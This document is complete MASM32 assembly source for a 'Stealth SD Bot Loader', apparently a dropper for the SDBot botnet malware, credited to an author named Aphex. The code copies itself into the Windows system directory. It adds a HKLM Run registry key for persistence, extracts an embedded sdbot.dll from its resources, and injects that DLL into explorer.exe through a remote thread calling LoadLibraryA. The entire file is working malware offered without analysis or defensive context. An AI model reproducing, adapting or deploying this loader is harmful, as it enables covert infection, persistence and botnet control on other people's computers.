;Stealth SD Bot Loader by Aphex
;http://www.iamaphex.cjb.net
;unremote@knology.net

.386
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\advapi32.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\SRT.lib 

xVirtualAllocEx PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
xCreateRemoteThread PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

.data

;installer name
szServerName byte 'sdloader.exe', 0

;sdbot dll name
szDllName byte 'sdbot.dll', 0

;regkey name
szKeyName byte 'sdbot05b (Aphex Editon)', 0

szBack byte '\', 0
szKernel32 byte 'KERNEL32.DLL', 0
szLoadLibrary byte 'LoadLibraryA', 0
szExplorer byte 'Shell_TrayWnd', 0
szRegValue byte 'Software\Microsoft\Windows\CurrentVersion\Run', 0

.data?
PID dword ?
RegKey dword ?
hThread dword ?
hProcess dword ?
hInstance dword ?
pParameters dword ?
BytesWritten dword ?
szDllPath byte 261 dup(?)
szSystemPath byte 261 dup(?)
szCurrentPath byte 261 dup(?)

.code
ExtractFile proc
local hResource:dword
local hResourceSize:dword
invoke GetSystemDirectory, addr szCurrentPath, 261
invoke lstrcat, addr szDllPath, addr szCurrentPath
invoke lstrcat, addr szDllPath, addr szBack
invoke lstrcat, addr szDllPath, addr szDllName
invoke GetModuleHandle, 0
mov hInstance, eax
invoke FindResource, hInstance, 1000, RT_RCDATA
.if eax != 0
  mov hResource, eax
  invoke SizeofResource, hInstance, hResource
  .if eax != 0
    mov hResourceSize, eax
    invoke LoadResource, hInstance, hResource
    .if eax != 0
      invoke LockResource, eax
      mov hResource, eax
      invoke CreateFile, addr szDllPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
      .if eax != INVALID_HANDLE_VALUE
        push eax
        invoke WriteFile, eax, hResource, hResourceSize, addr BytesWritten, 0
        pop eax
        invoke CloseHandle, eax
      .endif
    .endif
  .endif  
.endif
ret
ExtractFile endp

_entrypoint:
invoke GetSystemDirectory, addr szCurrentPath, 261
invoke lstrcat, addr szSystemPath, addr szCurrentPath
invoke lstrcat, addr szSystemPath, addr szBack
invoke lstrcat, addr szSystemPath, addr szServerName
invoke GetModuleFileName, 0, addr szCurrentPath, 261
invoke lstrcmpi, addr szCurrentPath, addr szSystemPath
.if eax != 0
  invoke DeleteFile, addr szSystemPath
  invoke CopyFile, addr szCurrentPath, addr szSystemPath, 0
  invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr szRegValue, 0, KEY_ALL_ACCESS, addr RegKey
  invoke RegSetValueEx, RegKey, addr szKeyName, 0, REG_SZ, addr szKeyName, sizeof szKeyName
  invoke RegCloseKey, RegKey
  invoke WinExec, addr szSystemPath, 0
  jmp @F
.endif
invoke ExtractFile
invoke FindWindow, addr szExplorer, 0
invoke GetWindowThreadProcessId, eax, addr PID
invoke OpenProcess, PROCESS_ALL_ACCESS, 0, PID
mov hProcess, eax
invoke xVirtualAllocEx, hProcess, 0, sizeof szDllName, MEM_COMMIT, PAGE_READWRITE
mov pParameters, eax
invoke WriteProcessMemory, hProcess, pParameters, offset szDllName, sizeof szDllName, 0
invoke GetModuleHandle, addr szKernel32
invoke GetProcAddress, eax, addr szLoadLibrary
invoke xCreateRemoteThread, hProcess, 0, 0, eax, pParameters, 0, 0
mov hThread, eax
invoke WaitForSingleObject, hThread, INFINITE
invoke CloseHandle, hThread
invoke CloseHandle, hProcess
@@:
invoke ExitProcess, 0
end _entrypoint